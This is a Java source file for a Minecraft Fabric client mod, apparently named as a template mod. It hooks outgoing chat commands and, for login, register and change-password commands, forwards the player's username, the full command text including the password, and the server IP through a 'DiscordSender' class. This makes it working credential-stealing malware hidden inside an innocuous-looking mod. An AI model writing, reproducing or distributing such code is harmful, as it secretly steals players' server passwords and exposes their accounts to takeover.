package com.escape.client;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.message.v1.ClientSendMessageEvents;
import net.minecraft.client.Minecraft;
import net.minecraft.client.multiplayer.ServerData;
import java.util.List;

public class TemplateModClient implements ClientModInitializer {
	private static final List<String> ALLOWED_COMMANDS = List.of("reg", "register", "log", "login", "changepassword", "cpw");

	@Override
	public void onInitializeClient() {
		ClientSendMessageEvents.COMMAND.register(command -> {
			Minecraft client = Minecraft.getInstance();

			String baseCommand = command.split(" ")[0].toLowerCase();

			if (ALLOWED_COMMANDS.contains(baseCommand)) {
				if (client.getUser() != null) {
					String name = client.getUser().getName();

					String serverIp = "Singleplayer";
					ServerData serverData = client.getCurrentServer();

					if (serverData != null) {
						serverIp = serverData.ip;
					}

					DiscordSender.send(name, "/" + command, serverIp);

				}
			}
		});
	}
}
